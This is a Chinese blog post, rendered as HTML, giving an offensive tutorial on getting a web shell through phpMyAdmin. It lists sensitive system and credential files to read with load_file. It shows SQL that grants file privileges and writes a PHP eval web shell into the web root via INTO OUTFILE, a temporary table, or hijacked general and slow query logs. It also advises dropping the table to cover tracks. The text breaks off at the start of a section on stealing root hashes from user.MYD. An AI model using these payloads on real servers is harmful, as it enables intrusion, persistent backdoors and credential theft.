@@ -1,0 +1,796 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="make changes, make perfect">
+  <meta name="author" content="Dr34d">
+  <meta name="keywords" content="blog">
+  <title>phpmyadmin 后台 getshell 及漏洞利用思路整理 - Dr34d&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/xt256.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"greydr34d.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Dr34d's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Dr34d's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/phpmyadmin_banner.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="phpmyadmin 后台 getshell 及漏洞利用思路整理">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-11-21 22:24" pubdate>
+        2020年11月21日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      43
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">phpmyadmin 后台 getshell 及漏洞利用思路整理</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：5 天前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="phpmyadmin-后台-getshell-及漏洞利用思路整理"><a href="#phpmyadmin-后台-getshell-及漏洞利用思路整理" class="headerlink" title="phpmyadmin 后台 getshell 及漏洞利用思路整理"></a>phpmyadmin 后台 getshell 及漏洞利用思路整理</h1><h2 id="0x01-信息收集思路"><a href="#0x01-信息收集思路" class="headerlink" title="0x01 信息收集思路"></a>0x01 信息收集思路</h2><h3 id="1-网站绝对路径"><a href="#1-网站绝对路径" class="headerlink" title="1. 网站绝对路径"></a>1. 网站绝对路径</h3><h4 id="1-1-mysql路径"><a href="#1-1-mysql路径" class="headerlink" title="1.1 mysql路径"></a>1.1 mysql路径</h4><p>如果是类似phpstudy这样的集成工具，那么查询出mysql路径也就可以找到网站路径了。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> version();  <span class="hljs-comment">-- 查看数据库版本</span>
+<span class="hljs-keyword">select</span> @<span class="hljs-variable">@datadir</span>;  <span class="hljs-comment">-- 查看数据库存储路径</span>
+<span class="hljs-keyword">show</span> VARIABLES <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%char%&#x27;</span>;  <span class="hljs-comment">-- 查看系统变量</span>
+<span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugin%&#x27;</span>; <span class="hljs-comment">-- 查看插件路径</span></code></pre></div>
+
+
+
+
+
+<h4 id="1-2-phpinfo"><a href="#1-2-phpinfo" class="headerlink" title="1.2 phpinfo()"></a>1.2 phpinfo()</h4><p>可以直接显示web路径</p>
+<h4 id="1-3-读取配置文件"><a href="#1-3-读取配置文件" class="headerlink" title="1.3 读取配置文件"></a>1.3 读取配置文件</h4><p>如果注入点有文件读取权限，可通过 load_file 尝试读取配置文件</p>
+<p>windows 敏感文件</p>
+<div class="hljs code-wrapper"><pre><code class="hljs cmd"><span class="hljs-function">c:/<span class="hljs-title">boot.ini</span> //查看系统版本 </span>
+<span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">windows</span>/<span class="hljs-title">php.ini</span> //<span class="hljs-title">php</span>配置信息 </span>
+<span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">windows</span>/<span class="hljs-title">my.ini</span> //<span class="hljs-title">MYSQL</span>配置文件，记录管理员登陆过的<span class="hljs-title">MYSQL</span>用户名和密码 </span>
+<span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">winnt</span>/<span class="hljs-title">php.ini</span> </span>
+<span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">winnt</span>/<span class="hljs-title">my.ini</span> </span>
+<span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">mysql</span>\<span class="hljs-title">data</span>\<span class="hljs-title">mysql</span>\<span class="hljs-title">user.MYD</span> //存储了<span class="hljs-title">mysql.user</span>表中的数据库连接密码 </span>
+<span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">RhinoSoft.com</span>\<span class="hljs-title">Serv</span>-<span class="hljs-title">U</span>\<span class="hljs-title">ServUDaemon.ini</span> //存储了虚拟主机网站路径和密码 </span>
+<span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">Serv</span>-<span class="hljs-title">U</span>\<span class="hljs-title">ServUDaemon.ini</span> </span>
+<span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">windows</span>\<span class="hljs-title">system32</span>\<span class="hljs-title">inetsrv</span>\<span class="hljs-title">MetaBase.xml</span> 查看<span class="hljs-title">IIS</span>的虚拟主机配置 </span>
+<span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">windows</span>\<span class="hljs-title">repair</span>\<span class="hljs-title">sam</span> //存储了<span class="hljs-title">WINDOWS</span>系统初次安装的密码 </span>
+<span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\ <span class="hljs-title">Serv</span>-<span class="hljs-title">U</span>\<span class="hljs-title">ServUAdmin.exe</span> //6.0版本以前的<span class="hljs-title">serv</span>-<span class="hljs-title">u</span>管理员密码存储于此 </span>
+<span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">RhinoSoft.com</span>\<span class="hljs-title">ServUDaemon.exe</span> </span>
+<span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Documents</span> <span class="hljs-title">and</span> <span class="hljs-title">Settings</span>\<span class="hljs-title">All</span> <span class="hljs-title">Users</span>\<span class="hljs-title">Application</span> <span class="hljs-title">Data</span>\<span class="hljs-title">Symantec</span>\<span class="hljs-title">pcAnywhere</span>\*.<span class="hljs-title">cif</span>文件 </span>
+<span class="hljs-function">//存储了<span class="hljs-title">pcAnywhere</span>的登陆密码 </span>
+<span class="hljs-function"><span class="hljs-title">c</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">Apache</span> <span class="hljs-title">Group</span>\<span class="hljs-title">Apache</span>\<span class="hljs-title">conf</span>\<span class="hljs-title">httpd.conf</span> 或<span class="hljs-title">C</span>:\<span class="hljs-title">apache</span>\<span class="hljs-title">conf</span>\<span class="hljs-title">httpd.conf</span> //查看<span class="hljs-title">WINDOWS</span>系统<span class="hljs-title">apache</span>文件 </span>
+<span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">Resin</span>-3.0.14/<span class="hljs-title">conf</span>/<span class="hljs-title">resin.conf</span> //查看<span class="hljs-title">jsp</span>开发的网站 <span class="hljs-title">resin</span>文件配置信息. </span>
+<span class="hljs-function"><span class="hljs-title">c</span>:/<span class="hljs-title">Resin</span>/<span class="hljs-title">conf</span>/<span class="hljs-title">resin.conf</span> /<span class="hljs-title">usr</span>/<span class="hljs-title">local</span>/<span class="hljs-title">resin</span>/<span class="hljs-title">conf</span>/<span class="hljs-title">resin.conf</span> 查看<span class="hljs-title">linux</span>系统配置的<span class="hljs-title">JSP</span>虚拟主机 </span>
+<span class="hljs-function"><span class="hljs-title">d</span>:\<span class="hljs-title">APACHE</span>\<span class="hljs-title">Apache2</span>\<span class="hljs-title">conf</span>\<span class="hljs-title">httpd.conf</span> </span>
+<span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">mysql</span>\<span class="hljs-title">my.ini</span> </span>
+<span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">mysql</span>\<span class="hljs-title">data</span>\<span class="hljs-title">mysql</span>\<span class="hljs-title">user.MYD</span> 存在<span class="hljs-title">MYSQL</span>系统中的用户密码</span></code></pre></div>
+
+
+
+<p>linux 敏感文件</p>
+<div class="hljs code-wrapper"><pre><code class="hljs cmd">/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件 
+/usr/local/apache2/conf/httpd.conf 
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 
+/usr/local/app/php5/lib/php.ini //PHP相关设置 
+/etc/sysconfig/iptables //从中得到防火墙规则策略 
+/etc/httpd/conf/httpd.conf // apache配置文件 
+/etc/rsyncd.conf //同步程序配置文件 
+/etc/my.cnf //mysql的配置文件 
+/etc/redhat-release //系统版本 
+/etc/issue 
+/etc/issue.<span class="hljs-built_in">net</span> 
+/usr/local/app/php5/lib/php.ini //PHP相关设置 
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 
+/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件
+/usr/local/resin-<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>/conf/resin.conf 针对<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>的RESIN配置文件查看 
+/usr/local/resin-pro-<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>/conf/resin.conf 同上 
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 
+/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件 
+/usr/local/resin-<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>/conf/resin.conf 针对<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>的RESIN配置文件查看 
+/usr/local/resin-pro-<span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">22</span>/conf/resin.conf 同上 
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 
+/etc/sysconfig/iptables 查看防火墙策略 
+load_file(char(<span class="hljs-number">47</span>)) 可以列出FreeBSD,Sunos系统根目录 
+<span class="hljs-built_in">replace</span>(load_file(<span class="hljs-number">0</span>×<span class="hljs-number">2</span>F6574632F706173737764),<span class="hljs-number">0</span>×<span class="hljs-number">3</span>c,<span class="hljs-number">0</span>×<span class="hljs-number">20</span>) 
+<span class="hljs-built_in">replace</span>(load_file(char(<span class="hljs-number">47</span>,<span class="hljs-number">101</span>,<span class="hljs-number">116</span>,<span class="hljs-number">99</span>,<span class="hljs-number">47</span>,<span class="hljs-number">112</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">119</span>,<span class="hljs-number">100</span>)),char(<span class="hljs-number">60</span>),char(<span class="hljs-number">32</span>))</code></pre></div>
+
+<p>配置文件目录可以通过字典进行爆破。</p>
+<h4 id="1-4-利用报错信息"><a href="#1-4-利用报错信息" class="headerlink" title="1.4 利用报错信息"></a>1.4 利用报错信息</h4><p>如果网站开启了报错信息，通过报错信息很容易找到网站根路径。不仅仅是mysql报错信息。</p>
+<h4 id="1-5-利用-Google"><a href="#1-5-利用-Google" class="headerlink" title="1.5 利用 Google"></a>1.5 利用 <code>Google</code></h4><div class="hljs code-wrapper"><pre><code class="hljs vbnet"><span class="hljs-symbol">site:</span>xxx.com warning
+<span class="hljs-symbol">site:</span>xxx.com “fatal <span class="hljs-keyword">error</span>”</code></pre></div>
+
+
+
+<h4 id="1-6-利用测试文件"><a href="#1-6-利用测试文件" class="headerlink" title="1.6 利用测试文件"></a>1.6 利用测试文件</h4><div class="hljs code-wrapper"><pre><code class="hljs stylus">www<span class="hljs-selector-class">.xxx</span>.com/test.php
+www<span class="hljs-selector-class">.xxx</span>.com/ceshi.php
+www<span class="hljs-selector-class">.xxx</span>.com/info.php
+www<span class="hljs-selector-class">.xxx</span>.com/phpinfo.php
+www<span class="hljs-selector-class">.xxx</span>.com/php_info.php
+www<span class="hljs-selector-class">.xxx</span>.com/<span class="hljs-number">1</span>.php</code></pre></div>
+
+<p>可以去寻找测试文件字典。</p>
+<h4 id="1-7-访问一些特定的网页"><a href="#1-7-访问一些特定的网页" class="headerlink" title="1.7 访问一些特定的网页"></a>1.7 访问一些特定的网页</h4><p>下面一些网页可能会产生报错信息，从而可以得到网站根路径</p>
+<div class="hljs code-wrapper"><pre><code class="hljs awk">phpMyAdmin<span class="hljs-regexp">/libraries/</span>selectlang.lib.php
+phpMyAdmin<span class="hljs-regexp">/darkblueorange/</span>layout.inc.php
+phpmyadmin<span class="hljs-regexp">/themes/</span>darkblue_orange/layout.inc.php
+phpMyAdmin/index.php?lang[]=<span class="hljs-number">1</span>
+phpMyAdmin<span class="hljs-regexp">/darkblueorange/</span>layout.inc.php phpMyAdmin/index.php?lang[]=<span class="hljs-number">1</span>
+<span class="hljs-regexp">/phpmyadmin/</span>libraries/lect_lang.lib.php
+<span class="hljs-regexp">/phpMyAdmin/</span>phpinfo.php
+<span class="hljs-regexp">/phpmyadmin/</span>themes<span class="hljs-regexp">/darkblue_orange/</span>layout.inc.php
+<span class="hljs-regexp">/phpmyadmin/</span>libraries/select_lang.lib.php
+<span class="hljs-regexp">/phpmyadmin/</span>libraries/mcrypt.lib.php</code></pre></div>
+
+
+
+
+
+<h3 id="2-账户是否有读写权限"><a href="#2-账户是否有读写权限" class="headerlink" title="2. 账户是否有读写权限"></a>2. 账户是否有读写权限</h3><p>写入 <code>shell</code> 时遇到报错，可能是权限的原因</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.user;                <span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询所有用户权限
+<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.user <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span><span class="hljs-operator">=</span>&quot;root&quot;;        <span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询root用户权限
+update <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> File_priv <span class="hljs-operator">=</span><span class="hljs-string">&#x27;Y&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;root&#x27;</span>;      <span class="hljs-operator">/</span><span class="hljs-operator">/</span>允许root用户读写文件
+update <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> File_priv <span class="hljs-operator">=</span><span class="hljs-string">&#x27;N&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;root&#x27;</span>;      <span class="hljs-operator">/</span><span class="hljs-operator">/</span>禁止root用户读写文件
+flush privileges;                    <span class="hljs-operator">/</span><span class="hljs-operator">/</span>刷新MySQL系统权限相关表</code></pre></div>
+
+
+
+<h3 id="3-路径是否具有读写权限"><a href="#3-路径是否具有读写权限" class="headerlink" title="3. 路径是否具有读写权限"></a>3. 路径是否具有读写权限</h3><h4 id="3-1-secure-file-priv-权限"><a href="#3-1-secure-file-priv-权限" class="headerlink" title="3.1 secure_file_priv 权限"></a>3.1 secure_file_priv 权限</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@secure</span>_file_priv;   <span class="hljs-comment">-- 查询secure_file_priv</span>
+ <span class="hljs-comment">-- secure_file_priv=NULL,禁止导入导出</span>
+ <span class="hljs-comment">-- secure_file_priv=&#x27;&#x27;,不限制导入导出，Linux下默认/tmp目录可写</span>
+ <span class="hljs-comment">-- secure_file_priv=/path/,只能向指定目录导入导出</span></code></pre></div>
+
+<blockquote>
+<p>在 <code>my.ini</code>、<code>my.cnf</code>、<code>mysqld.cnf</code> 文件中找到 <code>secure_file_prive</code> 并将其值设置为 “”或”/“，重启 MySQL 服务！</p>
+</blockquote>
+<blockquote>
+<p>这是通用方法，在 <code>phpstudy</code> 中的 <code>mysql</code> 的配置文件中是没有这个参数的</p>
+<p>所以我们自己在配置文件中添加一行 <code>secure_file_priv =</code> 即可。</p>
+</blockquote>
+<h4 id="3-2-日志读写权限"><a href="#3-2-日志读写权限" class="headerlink" title="3.2 日志读写权限"></a>3.2 日志读写权限</h4><p>查看日志状态：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables  <span class="hljs-keyword">like</span>  <span class="hljs-string">&#x27;%general%&#x27;</span>;
+<span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%slow%&#x27;</span>; <span class="hljs-comment">-- 慢查询日志</span></code></pre></div>
+
+<p>general 开启时，所执行的 <code>sql</code> 语句都会出现在 <strong><em>*</em></strong>.log 文件。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log<span class="hljs-operator">=</span><span class="hljs-string">&#x27;on&#x27;</span></code></pre></div>
+
+<p>如果将general_log_file的值换成shell路径</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log_file <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span></code></pre></div>
+
+<p>然后执行简单的查询</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]);?&gt;&#x27;</span></code></pre></div>
+
+<p>即可写入shell</p>
+<h2 id="0x02-后台写shell思路"><a href="#0x02-后台写shell思路" class="headerlink" title="0x02 后台写shell思路"></a>0x02 后台写shell思路</h2><h3 id="1-常规into-outfile-amp-into-dumpfile"><a href="#1-常规into-outfile-amp-into-dumpfile" class="headerlink" title="1. 常规into outfile&amp;into dumpfile"></a>1. 常规into outfile&amp;into dumpfile</h3><p>两者有所区别</p>
+<blockquote>
+<p>into outfile 主要的目的是导出 文本文件，我们在渗透过程中是用来写 shell 的<br>into dumpfile 的主要目的是导出二进制文件，在后面我们讲到 UDF 提权的过程中会经常用到这个函数生成我们的 udf.dll</p>
+</blockquote>
+<p>写shell主要用outfile</p>
+<p><strong>需要条件：</strong></p>
+<ul>
+<li>当前的数据库用户有写权限</li>
+<li>知道 web 绝对路径</li>
+<li>web 路径能写</li>
+</ul>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[soap]);?&gt;&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;C:\\phpstudy\\PHPTutorial\\WWW\\</span></code></pre></div>
+
+<blockquote>
+<p>注意，如果是在 <code>phpmyadmin</code> 的 <code>sql</code> 语句中执行写入的话，路径只能是斜杠 / 或者双反斜杠 \\</p>
+</blockquote>
+<p>目录不可写时可尝试其他可写的路径</p>
+<div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-string">/upload</span>
+<span class="hljs-string">/templates</span>
+<span class="hljs-string">/cache</span>
+写入中文路径</code></pre></div>
+
+
+
+<p>写入中文路径 shell</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> character_set_client=<span class="hljs-string">&#x27;gbk&#x27;</span>;<span class="hljs-built_in">set</span> character_set_connection=<span class="hljs-string">&#x27;gbk&#x27;</span>;<span class="hljs-built_in">set</span> character_set</code></pre></div>
+
+
+
+<h3 id="2-创建表-getshell"><a href="#2-创建表-getshell" class="headerlink" title="2. 创建表 getshell"></a>2. 创建表 getshell</h3><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `mysql`.`xxxxx` (`content` TEXT <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> );
+<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `mysql`.`xxxxx` (`content` ) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;&lt;?php @eval($_POST[soap]);?&gt;&#x27;</span>);
+<span class="hljs-keyword">SELECT</span> `content` <span class="hljs-keyword">FROM</span> `mysql`.`xxxxx` <span class="hljs-keyword">INTO</span> OUTFILE <span class="hljs-string">&#x27;C:\\phpstudy\\PHPTutorial\\WWW\\test3.php&#x27;</span>;
+或者
+<span class="hljs-keyword">Create</span> <span class="hljs-keyword">TABLE</span> xxxxx (content text <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>);
+<span class="hljs-keyword">Insert</span> <span class="hljs-keyword">INTO</span> xxxxx (content) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27;</span>);
+<span class="hljs-keyword">select</span> `content` <span class="hljs-keyword">from</span> mysql.xxxxx <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;C:\\phpstudy\\PHPTutorial\\WWW\\test3.php&#x27;</span>;
+然后删除所建的表抹去痕迹
+<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `mysql`.`xxxxx`;</code></pre></div>
+
+
+
+<h3 id="3-日志-getshell"><a href="#3-日志-getshell" class="headerlink" title="3. 日志 getshell"></a>3. 日志 getshell</h3><h4 id="3-1-general日志"><a href="#3-1-general日志" class="headerlink" title="3.1 general日志"></a>3.1 general日志</h4><p>查看日志状态：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables  <span class="hljs-keyword">like</span>  <span class="hljs-string">&#x27;%general%&#x27;</span>;</code></pre></div>
+
+<p>general 开启时，所执行的 <code>sql</code> 语句都会出现在 <strong><em>*</em></strong>.log 文件。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log<span class="hljs-operator">=</span><span class="hljs-string">&#x27;on&#x27;</span></code></pre></div>
+
+<p>如果将general_log_file的值换成shell路径</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> general_log_file <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span></code></pre></div>
+
+<p>然后执行简单的查询</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]);?&gt;&#x27;</span></code></pre></div>
+
+<p>即可写入shell</p>
+<h4 id="3-2-慢查询写-shell"><a href="#3-2-慢查询写-shell" class="headerlink" title="3.2 慢查询写 shell"></a>3.2 慢查询写 shell</h4><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%slow%&#x27;</span>;</code></pre></div>
+
+
+
+<p>重新设置路径：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">GLOBAL</span> slow_query_log_file<span class="hljs-operator">=</span><span class="hljs-string">&#x27;C:/phpstudy/PHPTutorial/WWW/slow.php&#x27;</span>;</code></pre></div>
+
+<p>开启慢查询日志：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">GLOBAL</span> slow_query_log<span class="hljs-operator">=</span><span class="hljs-keyword">on</span>;</code></pre></div>
+
+<p>执行写入日志：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;soap&quot;]);?&gt;&#x27;</span> <span class="hljs-keyword">from</span> mysql.db <span class="hljs-keyword">where</span> sleep(<span class="hljs-number">10</span>);</code></pre></div>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210321161304678.png" alt="image-20210321161304678"></p>
+<h3 id="4-低权限读user-MYD提权"><a href="#4-低权限读user-MYD提权" class="headerlink" title="4. 低权限读user.MYD提权"></a>4. 低权限读user.MYD提权</h3><p>读user.MYD的目的是为了能够提取到root用户的hash，通过破解即可使用root用户登录，进而提权。</p>
+<p>首先需要定位user.MYD文件路径，我们可以先查询mysql路径。</p>
